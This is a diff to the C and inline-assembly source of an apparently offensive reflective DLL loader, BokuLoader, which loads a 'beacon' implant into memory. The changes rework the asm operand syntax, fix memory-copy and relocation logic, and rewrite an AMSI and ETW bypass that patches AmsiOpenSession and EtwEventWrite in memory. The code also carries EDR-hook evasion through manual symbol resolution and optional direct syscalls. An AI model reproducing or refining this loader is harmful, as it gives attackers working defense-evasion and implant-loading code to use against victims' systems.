@@ -1,7 +1,7 @@
 #define WIN32_LEAN_AND_MEAN
 /* Uncomment to enable features */
 //#define NOHEADERCOPY // RDLL will not copy headers over to the loaded beacon
-//#define BYPASS       // ETW & AMSI bypass switch. Comment out this line to disable 
+//#define BYPASS       // ETW & AMSI bypass switch. Comment out this line to disable
 //#define SYSCALLS     // Use direct syscalls with HellGate & HalosGate instead of WINAPIs
 #include <windows.h>
 
@@ -70,9 +70,9 @@ typedef void*  (NTAPI  * tNtProt)        (HANDLE, PVOID, PVOID, unsigned long, P
 typedef void*  (NTAPI  * tNtAlloc)       (HANDLE, PVOID, unsigned long, PVOID, unsigned long, unsigned long);
 typedef void*  (NTAPI  * tNtFree)        (HANDLE, PVOID, PVOID, unsigned long);
 #else
-typedef void*  (WINAPI * tVirtualAlloc) (void*, unsigned __int64, unsigned long, unsigned long);
-typedef void*  (WINAPI * tVirtualProtect)(void*, unsigned __int64, unsigned long, unsigned long*);
-typedef void*  (WINAPI * tVirtualFree)(void* lpAddress, SIZE_T dwSize, DWORD dwFreeType);
+typedef void*  (WINAPI * tVirtualAlloc)  (void*, SIZE_T, unsigned long, unsigned long);
+typedef void*  (WINAPI * tVirtualProtect)(void*, SIZE_T, unsigned long, unsigned long*);
+typedef void*  (WINAPI * tVirtualFree)   (void* lpAddress, SIZE_T dwSize, DWORD dwFreeType);
 #endif
 
 #ifdef BYPASS
@@ -136,7 +136,6 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     char kstr5[] = {'V','i','r','t','u','a','l','F','r','e','e',0};
     tVirtualFree pVirtualFree        = (tVirtualFree)getSymbolAddress(kstr5, (void*)11, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
     #endif
-
  
     // AMSI & ETW Optional Bypass
     #ifdef BYPASS
@@ -169,7 +168,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     HellsGate((void*)(ULONG_PTR)NtFreeSyscallNumber);
     // 0x00008000 -> MEM_RELEASE
     SIZE_T RegionSize = 1;
-    HellDescent((HANDLE)-1, &rdll_dst.dllBase, &RegionSize, 0x00008000); // Deallocate the first memory page (4096/0x1000 bytes) 
+    HellDescent((HANDLE)-1, &rdll_dst.dllBase, &RegionSize, 0x00008000); // Deallocate the first memory page (4096/0x1000 bytes)
     #else
     pVirtualFree(rdll_dst.dllBase,1,0x00004000); // Decommit the first memory page (4096/0x1000 bytes) which would normally hold the copied over headers  - "Private:Reserved"
     #endif
@@ -189,8 +188,8 @@ __declspec(dllexport) void* WINAPI BokuLoader()
             "xor rbx, rbx \n"
             "mov ebx, [rax] \n"
             "xchg rax, rbx \n"
-            :[SectionRVA] "=r" (section.RVA)        // RAX OUT
-            :[nthSection] "r" (rdll_src.NthSection) // RAX IN
+            : "=r" (section.RVA)        // RAX OUT
+            : "r" (rdll_src.NthSection) // RAX IN
         );
         section.dst_rdll_VA = add(rdll_dst.dllBase, section.RVA);
         __asm__(
@@ -198,8 +197,8 @@ __declspec(dllexport) void* WINAPI BokuLoader()
             "xor rbx, rbx \n"
             "mov ebx, [rax] \n"
             "xchg rax, rbx \n"
-            :[PointerToRawData] "=r" (section.PointerToRawData)
-            :[nthSection] "r" (rdll_src.NthSection)
+            : "=r" (section.PointerToRawData) // RAX OUT
+            : "r" (rdll_src.NthSection)       // RAX IN
         );
         section.src_rdll_VA = add(rdll_src.dllBase, section.PointerToRawData);
         __asm__(
@@ -207,8 +206,8 @@ __declspec(dllexport) void* WINAPI BokuLoader()
             "xor rbx, rbx \n"
             "mov ebx, [rax] \n"
             "xchg rax, rbx \n"
-            :[SizeOfSection] "=r" (section.SizeOfSection) // RAX OUT
-            :[nthSection] "r" (rdll_src.NthSection) // RAX IN
+            : "=r" (section.SizeOfSection) // RAX OUT
+            : "r" (rdll_src.NthSection)    // RAX IN
         );
         // check if this is the .text section
         if (textSectionFlag == FALSE)
@@ -221,8 +220,8 @@ __declspec(dllexport) void* WINAPI BokuLoader()
                 "jne nottext \n"
                 "mov rax, 0x1 \n"
                 "nottext: \n"
-                :[textSectionFlag] "=r" (textSectionFlag) // RAX OUT
-                :[nthSection] "r" (rdll_src.NthSection) // RAX IN
+                : "=r" (textSectionFlag)    // RAX OUT
+                : "r" (rdll_src.NthSection) // RAX IN
             );
             // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
             if(textSectionFlag == TRUE)
@@ -245,9 +244,9 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         "mov ebx, [rax] \n"  // RVA of Import Directory
         "add rdx, rbx \n"    // Import Directory of beacon = RVA of Import Directory + New RDLL Base Address
         "xchg rax, rdx \n"
-        :[ImportDirectory] "=r" (ImportDirectory) // RAX OUT
-        :[DataDirectory] "r" (DataDirectory), // RAX IN 
-         [dllBase] "r" (rdll_dst.dllBase)     // RDX IN
+        : "=r" (ImportDirectory) // RAX OUT
+        : "r" (DataDirectory),   // RAX IN
+         "r" (rdll_dst.dllBase) // RDX IN
     );
     void* nImportDesc = ImportDirectory;
     Dll dll_import;
@@ -255,16 +254,12 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         "xor rbx, rbx \n"
         "add rdx, 0xC \n"        // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
         "mov ebx, [rdx] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
-        "push rbx \n"            // save the RVA for the Name of the DLL to be imported to the top of the stack
-        "pop rdx \n"             // R12&RBX = RVA of Name DLL
-        "cmp ebx, 0x0 \n"        // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
-        "je check1 \n"
-        "add rax, rbx \n"        // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
-        "check1: \n"
-        :[importNameRVA] "=r" (importNameRVA),  // RDX OUT 
-         [importName] "=r" (importName) // RAX OUT 
-        :[dllBase] "r" (rdll_dst.dllBase), // RAX IN
-         [nImportDesc] "r" (nImportDesc)// RDX IN 
+        "mov rdx, rbx \n"
+        "add rax, rdx \n"        // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
+        : "=r" (importNameRVA),   // RDX OUT
+         "=r" (importName)       // RAX OUT
+        : "r" (rdll_dst.dllBase), // RAX IN
+         "r" (nImportDesc)       // RDX IN
     );
     // The last entry in the image import directory is all zeros
     while(importNameRVA)
@@ -277,26 +272,26 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         __asm__(
             "xor rbx, rbx \n"        // importLookupTableEntry = VA of the OriginalFirstThunk
             "mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into EBX
-            "add rbx, rdx \n"        // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk 
+            "add rbx, rdx \n"        // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk
             "xchg rax, rbx \n"
-            :[LookupTableEntry] "=r" (LookupTableEntry)
-            :[nImportDesc] "r" (nImportDesc),
-             [dllBase] "r" (rdll_dst.dllBase)
+            : "=r" (LookupTableEntry) // RAX OUT
+            : "r" (nImportDesc),      // RAX IN        
+             "r" (rdll_dst.dllBase)  // RDX IN
         );
         __asm__(
             "xor rbx, rbx \n"        // importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
             "add rax, 0x10 \n"       // 16 (0x10) byte offset is the address of the DWORD FirstThunk within the image import descriptor
             "mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into EBX
-            "add rbx, rdx \n"        // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk 
+            "add rbx, rdx \n"        // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk
             "xchg rax, rbx \n"
-            :[AddressTableEntry] "=r" (AddressTableEntry)
-            :[nImportDesc] "r" (nImportDesc),
-             [dllBase] "r" (rdll_dst.dllBase)
+            : "=r" (AddressTableEntry) // RAX OUT
+            : "r" (nImportDesc),       // RAX IN
+             "r" (rdll_dst.dllBase)   // RDX IN
         );
         __asm__(
             "mov rax, [rax] \n"
-            :[nullCheck] "=r" (nullCheck)
-            :[AddressTableEntry] "r" (AddressTableEntry)
+            : "=r" (nullCheck)        // RAX OUT
+            : "r" (AddressTableEntry) // RAX IN
         );
         while(nullCheck)
         {
@@ -312,20 +307,20 @@ __declspec(dllexport) void* WINAPI BokuLoader()
                     "add rax, 0x10 \n"         // DWORD Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
                     "mov edx, [rax] \n"        // RAX = importedDllBaseOrdinal (Value/DWORD)
                     "xchg rax, rdx \n"
-                    :[BaseOrdinal] "=r" (BaseOrdinal)
-                    :[Directory] "r" (dll_import.Export.Directory)
+                    : "=r" (BaseOrdinal)                // RAX OUT
+                    : "r" (dll_import.Export.Directory) // RAX IN
                 );
                 __asm__( // Import Hint from the modules Hint/Name table
                     "mov rax, [rax] \n"        // RAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
                     "and eax, 0xFFFF \n"       // get rid of the 8
-                    :[importEntryHint] "=r" (importEntryHint)
-                    :[LookupTableEntry] "r" (LookupTableEntry)
+                    : "=r" (importEntryHint) // RAX OUT
+                    : "r" (LookupTableEntry) // RAX IN
                 );
                 __asm__( // Use the import entries Hint and the Imported Modules Base Ordinal from its Export Directory to find the index of our entry/import within the Export Address Table
                     "sub rax, rdx \n" // Import Hint from Hint/Name Table (first 2 bytes before the name string)
-                    :[TableIndex] "=r" (TableIndex)
-                    :[importEntryHint] "r" (importEntryHint),
-                     [BaseOrdinal] "r" (BaseOrdinal)
+                    : "=r" (TableIndex)      // RAX OUT
+                    : "r" (importEntryHint), // RAX IN
+                     "r" (BaseOrdinal)      // RDX IN
                 );
                 __asm__( // The ExportAddressTable/AddressOfFunctions holds DWORD (4 byte) RVA's for the executable functions/api's address
                     "mov r12, rdx \n"
@@ -337,17 +332,17 @@ __declspec(dllexport) void* WINAPI BokuLoader()
                     "mov ebx, [rax] \n"        // The RVA for the executable function we are importing
                     "add rcx, rbx \n"          // The executable address within the imported DLL for the function we imported
                     "xchg rax, rcx \n"
-                    :[EntryAddress] "=r" (EntryAddress)
-                    :[TableIndex]"r"(TableIndex),                       // RAX IN - importEntryExportTableIndex
-                    [AddressTable]"r"(dll_import.Export.AddressTable),  // RDX IN - AddressTable 
-                    [dllBase] "r" (dll_import.dllBase)                  // RCX IN - dllBase
+                    : "=r" (EntryAddress)                 // RAX OUT
+                    : "r"(TableIndex),                    // RAX IN - importEntryExportTableIndex
+                     "r"(dll_import.Export.AddressTable), // RDX IN - AddressTable
+                     "r" (dll_import.dllBase)             // RCX IN - dllBase
                 );
                 // patch in the address for this imported function
                 __asm__(
                     "mov [rax], rdx \n"  // write the address of the imported api to our import table
                     : // no outputs
-                    :[AddressTableEntry] "r" (AddressTableEntry),  // RAX IN = The import table entry we are going to overwrite
-                     [EntryAddress] "r" (EntryAddress)             // RDX IN 
+                    : "r" (AddressTableEntry), // RAX IN = The import table entry we are going to overwrite
+                     "r" (EntryAddress)       // RDX IN
                  );
             }
             else
@@ -356,9 +351,9 @@ __declspec(dllexport) void* WINAPI BokuLoader()
                     "mov rax, [rax] \n" // RVA for our functions Name/Hint table entry
                     "add rax, rdx \n"   // VA (Address in memory) Name/Hint Entry = RVA Name/Hint Entry + New RDLL Address
                     "add rax, 0x2 \n"   // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
-                    :[EntryName] "=r" (EntryName) 
-                    :[AddressTableEntry] "r" (AddressTableEntry),  // import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
-                     [dllBase] "r" (rdll_dst.dllBase)
+                    : "=r" (EntryName)         // RAX OUT
+                    : "r" (AddressTableEntry), // RAX IN, import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
+                     "r" (rdll_dst.dllBase)   // RDX IN
                 );
                 __asm__(
                     "xor rcx, rcx \n"   // Get the string length for the import function name
@@ -370,10 +365,10 @@ __declspec(dllexport) void* WINAPI BokuLoader()
                     "inc rax \n"        // move to the next char of the string
                     "jmp short countLoop \n"
                     "fStrLen: \n"
-                    "xchg rax, rcx \n" 
-                    :[len_EntryName] "=r" (len_EntryName) 
-                    :[EntryName] "r" (EntryName) 
-                );    
+                    "xchg rax, rcx \n"
+                    : "=r" (len_EntryName) // RAX OUT
+                    : "r" (EntryName)      // RDX IN
+                );
                 // use GetSymbolAddress to dodge EDR hooks on GetProcAddress() and patch in the address for this imported function
                 EntryAddress = getSymbolAddress(EntryName, len_EntryName, dll_import.dllBase, dll_import.Export.AddressTable, dll_import.Export.NameTable, dll_import.Export.OrdinalTable);
                 // If getSymbolAddress() returned a NULL then the symbol is a forwarder string. Use normal GetProcAddress() to handle forwarder
@@ -383,8 +378,8 @@ __declspec(dllexport) void* WINAPI BokuLoader()
                 __asm__(
                     "mov [rax], rdx \n"  // write the address of the imported api to our import table
                     : // no outputs
-                    :[AddressTableEntry] "r" (AddressTableEntry),  // import table entry we are going to overwrite
-                     [EntryAddress] "r" (EntryAddress) 
+                    : "r" (AddressTableEntry), // RAX OUT, import table entry we are going to overwrite
+                     "r" (EntryAddress)       // RDX IN
                 );
             }
             AddressTableEntry += 0x8;
@@ -392,61 +387,57 @@ __declspec(dllexport) void* WINAPI BokuLoader()
                 LookupTableEntry += 0x8;
             __asm__(
                 "mov rax, [rax] \n"
-                :[nullCheck] "=r" (nullCheck)
-                :[AddressTableEntry] "r" (AddressTableEntry)
+                : "=r" (nullCheck)        // RAX OUT
+                : "r" (AddressTableEntry) // RAX IN
             );
         }
         nImportDesc += 0x14; // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
         __asm__( // Do this again for the next module/DLL in the Import Directory
             "xor rbx, rbx \n"
             "add rax, 0xC  \n"  // 12(0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
-            "mov ebx, [rax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name 
-            "push rbx \n"       // save the RVA for the Name of the DLL to be imported to the top of the stack
-            "pop rax \n"        // RVA of Name DLL
-            "cmp ebx, 0x0 \n"   // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
-            "je check2 \n"
-            "add rdx, rbx \n"   // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
-            "check2: \n"
-            :[importName] "=r" (importName),       // RDX OUT
-             [importNameRVA] "=r" (importNameRVA)  // RAX OUT
-            :[nImportDesc] "r" (nImportDesc),
-             [newRdllAddr] "r" (rdll_dst.dllBase)
+            "mov ebx, [rax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name
+            "mov rax, rbx \n"   // RVA of Name DLL
+            "add rdx, rax \n"   // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
+            : "=r" (importName),     // RDX OUT
+             "=r" (importNameRVA)   // RAX OUT
+            : "r" (nImportDesc),     // RAX IN
+             "r" (rdll_dst.dllBase) // RDX IN
         );
     }
     void* nextRelocBlock, *RelocDirSize, *BaseAddressDelta, *relocBlockSize, *relocVA, *RelocBlockEntries, *nextRelocBlockEntry;
     __asm__(
         "add rdx, 0x18 \n"            // OptionalHeader.ImageBase
         "mov rdx, [rdx] \n"
-        "sub rax, rdx \n"             // dllBase.ImageBase
-        :[BaseAddressDelta] "=r" (BaseAddressDelta)
-        :[dllBase] "r" (rdll_dst.dllBase),
-        [OptionalHeader] "r" (rdll_src.OptionalHeader)
+        "sub rax, rdx \n"              // dllBase.ImageBase
+        : "=r" (BaseAddressDelta)       // RAX OUT
+        : "r" (rdll_dst.dllBase),       // RAX IN
+         "r" (rdll_src.OptionalHeader) // RDX IN
     );
     void* RelocDir = rdll_src.OptionalHeader + 0x98; // OptionalHeader+0x98 = &DataDirectory[Base Relocation Table]
     __asm__(
         "xor rbx, rbx \n"
         "mov ebx, [rdx] \n"           // 4 byte DWORD Virtual Address of the Relocation Directory table
         "add rax, rbx \n"             // newRelocationTableAddr = dllBase + RVAnewRelocationTable
-        :[nextRelocBlock] "=r" (nextRelocBlock)
-        :[dllBase] "r" (rdll_dst.dllBase),
-        [RelocDir] "r" (RelocDir)       
+        : "=r" (nextRelocBlock)   // RAX OUT
+        : "r" (rdll_dst.dllBase), // RAX IN
+         "r" (RelocDir)          // RDX IN
     );
     __asm__(
         "xor rbx, rbx \n"
-        "mov ebx, [rax+0x4] \n"       // 4 byte DWORD Size of the Relocation Directory table 
+        "mov ebx, [rax+0x4] \n"       // 4 byte DWORD Size of the Relocation Directory table
         "xchg rax, rbx \n"
-        :[RelocDirSize] "=r" (RelocDirSize)
-        :[RelocDir] "r" (RelocDir)
+        : "=r" (RelocDirSize) // RAX OUT
+        : "r" (RelocDir)      // RAX IN
     );
-    
-    if(RelocDirSize) // check if their are any relocations present
+
+    if(RelocDirSize && BaseAddressDelta) // check if their are any relocations present
     {
         __asm__(
             "xor rbx, rbx \n"
             "mov ebx, [rax+0x4] \n"   // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
             "xchg rax, rbx \n"
-            :[relocBlockSize] "=r" (relocBlockSize)
-            :[nextRelocBlock] "r" (nextRelocBlock)
+            : "=r" (relocBlockSize) // RAX OUT
+            : "r" (nextRelocBlock)  // RAX IN
         );
         while(relocBlockSize)
         {
@@ -454,19 +445,17 @@ __declspec(dllexport) void* WINAPI BokuLoader()
                 "xor rbx, rbx \n"
                 "mov ebx, [rdx] \n"   // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->VirtualAddress
                 "add rax, rbx \n"     // &reflectiveDll.dll + nextRelocationBlockRVA = VA of next Relocation Block
-                :[relocVA] "=r" (relocVA)
-                :[dllBase] "r" (rdll_dst.dllBase),
-                 [nextRelocBlock] "r" (nextRelocBlock)
+                : "=r" (relocVA)          // RAX OUT
+                : "r" (rdll_dst.dllBase), // RAX IN
+                 "r" (nextRelocBlock)    // RDX IN
             );
             __asm__(
-                "xor rbx, rbx \n"
                 "xor rdx, rdx \n"
-                "inc bl \n"
-                "inc bl \n"           // 0x2 = size of image relocation WORD
-                "sub ax, 0x8 \n"      // Minus the 8 byte IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
-                "div bx \n"           // relocBlockSize/2
-                :[RelocBlockEntries] "=r" (RelocBlockEntries)
-                :[relocBlockSize] "r" (relocBlockSize)
+                "mov rbx, 0x2 \n" // 0x2 = size of image relocation WORD
+                "sub ax, 0x8 \n"  // Minus the 8 byte IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
+                "div bx \n"       // relocBlockSize/2
+                : "=r" (RelocBlockEntries) // RAX OUT
+                : "r" (relocBlockSize)     // RAX IN
             );
             nextRelocBlockEntry = nextRelocBlock + 0x8;
             while( RelocBlockEntries-- )
@@ -486,23 +475,22 @@ __declspec(dllexport) void* WINAPI BokuLoader()
                     "mov [rdx], rbx \n"  // WRITE THAT RELOC!
                     "badtype:\n"
                     : // no outputs
-                    :[nextRelocBlockEntry] "r" (nextRelocBlockEntry),
-                    [relocVA] "r" (relocVA),
-                    [BaseAddressDelta] "r" (BaseAddressDelta)
+                    : "r" (nextRelocBlockEntry), // RAX OUT
+                     "r" (relocVA),             // RAX IN
+                     "r" (BaseAddressDelta)     // RDX IN
                 );
                 nextRelocBlockEntry += 0x2;
             }
             nextRelocBlock = add(nextRelocBlock, relocBlockSize);
             __asm__(
                 "xor rbx, rbx \n"
-                "mov ebx, [rax+0x4] \n"  // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock 
+                "mov ebx, [rax+0x4] \n"  // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
                 "xchg rax, rbx \n"
-                :[relocBlockSize] "=r" (relocBlockSize)
-                :[nextRelocBlock] "r" (nextRelocBlock)
+                : "=r" (relocBlockSize) // RAX OUT
+                : "r" (nextRelocBlock)  // RAX IN
             );
         }
     }
-    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
     unsigned long oldprotect = 0;
     #ifdef SYSCALLS
     HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
@@ -515,6 +503,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     pNtFlushInstructionCache((void*)-1, NULL, 0);
     #endif
 
+    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
     ((DLLMAIN)rdll_dst.EntryPoint)( rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
     return rdll_dst.EntryPoint;
 }
@@ -527,15 +516,12 @@ void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA){
     SIZE_T bytesWritten;
 
     #ifdef SYSCALLS
-    char ntstr5[] = {'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
-    tNtWrite pNtWriteVirtualMemory = getSymbolAddress(ntstr5, (void*)20, ntdll->dllBase, ntdll->Export.AddressTable, ntdll->Export.NameTable, ntdll->Export.OrdinalTable);
-    DWORD NtWriteSyscallNumber = getSyscallNumber(pNtWriteVirtualMemory);
     char ntstr3[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
     tNtProt pNtProtectVirtualMemory = getSymbolAddress(ntstr3, (void*)22, ntdll->dllBase, ntdll->Export.AddressTable, ntdll->Export.NameTable, ntdll->Export.OrdinalTable);
     DWORD NtProtSyscallNumber = getSyscallNumber(pNtProtectVirtualMemory);
     #else
-    char wpm[] = {'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0};
-    tWriteProcessMemory pWriteProcessMemory = getSymbolAddress(wpm, (PVOID)18, k32->dllBase, k32->Export.AddressTable, k32->Export.NameTable, k32->Export.OrdinalTable);
+    char vp[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};
+    tVirtualProtect pVirtualProtect  = (tVirtualProtect)getSymbolAddress(vp, (void*)14, k32->dllBase, k32->Export.AddressTable, k32->Export.NameTable, k32->Export.OrdinalTable);
     #endif
     // ######### AMSI.AmsiOpenSession Bypass
     char as[] = {'a','m','s','i','.','d','l','l',0};
@@ -557,18 +543,22 @@ void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA){
         Base = pAmsiOpenSession;
         Size = sizeof(amsibypass);
 
-        // make memory region RWX
         #ifdef SYSCALLS
+        // make memory region RWX
         HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
         HellDescent((HANDLE)-1, &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
         // write the bypass
-        HellsGate((void*)(ULONG_PTR)NtWriteSyscallNumber);
-        HellDescent((HANDLE)-1, pAmsiOpenSession, amsibypass, sizeof(amsibypass), &bytesWritten);
+        copyMemory((void*)sizeof(amsibypass), amsibypass, pAmsiOpenSession);
         // make memory region RX again
         HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
         HellDescent((HANDLE)-1, &Base, &Size, oldprotect, &oldprotect);
         #else
-        pWriteProcessMemory((PVOID)-1, pAmsiOpenSession, (PVOID)amsibypass, Size, &bytesWritten);
+        // make memory region RWX
+        pVirtualProtect(pAmsiOpenSession, sizeof(amsibypass), PAGE_EXECUTE_READWRITE, &oldprotect);
+        // write the bypass
+        copyMemory((void*)sizeof(amsibypass), amsibypass, pAmsiOpenSession);
+        // make memory region RX again
+        pVirtualProtect(pAmsiOpenSession, sizeof(amsibypass), oldprotect, &oldprotect);
         #endif
     }
 
@@ -580,21 +570,24 @@ void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA){
         unsigned char etwbypass[] = { 0xc3 }; // ret
         Base = pEtwEventWrite;
         Size = sizeof(etwbypass);
-        // make memory region RWX
         #ifdef SYSCALLS
+        // make memory region RWX
         HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
         HellDescent((HANDLE)-1, &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
         // write the bypass
-        HellsGate((void*)(ULONG_PTR)NtWriteSyscallNumber);
-        HellDescent((HANDLE)-1, pEtwEventWrite, etwbypass, sizeof(etwbypass), &bytesWritten);
+        copyMemory((void*)sizeof(etwbypass), etwbypass, pEtwEventWrite);
         // make memory region RX again
         HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
         HellDescent((HANDLE)-1, &Base, &Size, oldprotect, &oldprotect);
         #else
-        pWriteProcessMemory((PVOID)-1, pEtwEventWrite, (PVOID)etwbypass, Size, &bytesWritten);
+        // make memory region RWX
+        pVirtualProtect(pEtwEventWrite, sizeof(etwbypass), PAGE_EXECUTE_READWRITE, &oldprotect);
+        // write the bypass
+        copyMemory((void*)sizeof(etwbypass), etwbypass, pEtwEventWrite);
+        // make memory region RX again
+        pVirtualProtect(pEtwEventWrite, sizeof(etwbypass), oldprotect, &oldprotect);
         #endif
     }
-
     return;
 }
 #endif
@@ -636,24 +629,24 @@ __asm__(
 "dec2: \n"
     "dec rcx \n"
     "cmp bx, word ptr ds:[rcx] \n" // Compare the first 2 bytes of the page to "MZ"
-    "jne dec2 \n"            
+    "jne dec2 \n"
     "xor rax, rax \n"
     "mov ax, [rcx+0x3C] \n"        // IMAGE_DOS_HEADER-> LONG   e_lfanew;  // File address of new exe header
     "add rax, rcx \n"              // DLL base + RVA new exe header = 0x00004550 PE00 Signature
     "xor rbx, rbx \n"
     "add bx, 0x4550 \n"             // PEOO
     "cmp bx, word ptr ds:[rax] \n" // Compare the 4 bytes to PE\0\0
-    "jne dec1 \n"            
+    "jne dec1 \n"
     "mov rax, rcx \n"              // Return the base address of our reflective DLL
     "ret \n"                       // return initRdllAddr
 "getDllBase: \n"
     "xor rax, rax \n"              // 0x0
-    "mov rcx, [rcx] \n"            // First 8 bytes of string 
+    "mov rcx, [rcx] \n"            // First 8 bytes of string
 "getMemList: \n"
     "mov rbx, gs:[rax+0x60] \n"    // ProcessEnvironmentBlock // GS = TEB
     "mov rbx, [rbx+0x18] \n"       // _PEB_LDR_DATA
     "mov rbx, [rbx+0x20] \n"       // InMemoryOrderModuleList - First Entry (probably the host PE File)
-    "mov r11, rbx \n" 
+    "mov r11, rbx \n"
 "crawl: \n"
     "mov rax, [rbx+0x50] \n"       // BaseDllName Buffer
     "mov rax, [rax] \n"            // First 4 Unicode bytes of the DLL string from the Ldr List
@@ -685,15 +678,15 @@ __asm__(
     "ret \n" // return ExportAddressTable
 "getExportNameTable: \n"
     "xor rax, rax \n"
-    "add rdx, 0x20 \n"         // DWORD AddressOfFunctions; // 0x20 offset 
+    "add rdx, 0x20 \n"         // DWORD AddressOfFunctions; // 0x20 offset
     "mov eax, [rdx] \n"        // RVAExportAddressOfNames (Value/RVA)
-    "add rax, rcx \n"          // VA ExportAddressOfNames 
+    "add rax, rcx \n"          // VA ExportAddressOfNames
     "ret \n" // return ExportNameTable;
 "getExportOrdinalTable: \n"
     "xor rax, rax \n"
-    "add rdx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset 
+    "add rdx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset
     "mov eax, [rdx] \n"        // RVAExportAddressOfNameOrdinals (Value/RVA)
-    "add rax, rcx \n"          // VA ExportAddressOfNameOrdinals 
+    "add rax, rcx \n"          // VA ExportAddressOfNameOrdinals
     "ret \n" // return ExportOrdinalTable;
 "getSymbolAddress: \n"
     "mov r10, [RSP+0x28] \n"   // ExportNameTable
@@ -731,20 +724,23 @@ __asm__(
     "mov ebx, [rcx+0x50] \n"   // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfImage
     "mov rax, rbx \n"
     "ret \n" // return dllSize;
-    "getDllSizeOfHeaders: \n"
+"getDllSizeOfHeaders: \n"
     "xor rbx, rbx \n"
     "mov ebx, [rax+0x54] \n"   // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfHeaders
     "mov rax, rbx \n"
     "ret \n" // return SizeOfHeaders;
 "copyMemory: \n"
+    "test ecx, ecx \n"         // check if ecx = 0
+    "jne copy1 \n"             // if ecx == 0, ret
+    "ret \n"
+"copy1: \n"
     "dec ecx \n"               // Decrement the counter
-    "xor rbx, rbx \n"
-    "mov bl, [rdx] \n"        // Load the next byte to write into the BL register
+    "mov bl, [rdx] \n"         // Load the next byte to write into the BL register
     "mov [r8], bl \n"          // write the byte
-    "inc rdx \n"               // move rdx to next byte of source 
-    "inc r8 \n"                // move r8 to next byte of destination 
+    "inc rdx \n"               // move rdx to next byte of source
+    "inc r8 \n"                // move r8 to next byte of destination
     "test rcx, rcx \n"         // check if rax = 0
-    "jne copyMemory \n"        // if rax != 0, then write next byte via loop
+    "jne copy1 \n"             // if rax != 0, then write next byte via loop
     "ret \n"
 "getOptionalHeader: \n"
     "add rcx, 0x18 \n"
@@ -755,16 +751,16 @@ __asm__(
     "xor rbx, rbx \n"
     "mov bx, [rcx] \n"          // Value of FileHeader.SizeOfOptionalHeader
     "xchg rax, rbx \n"
-    "ret \n" 
+    "ret \n"
 "add: \n"
     "add rcx, rdx \n"
     "xchg rax, rcx \n"
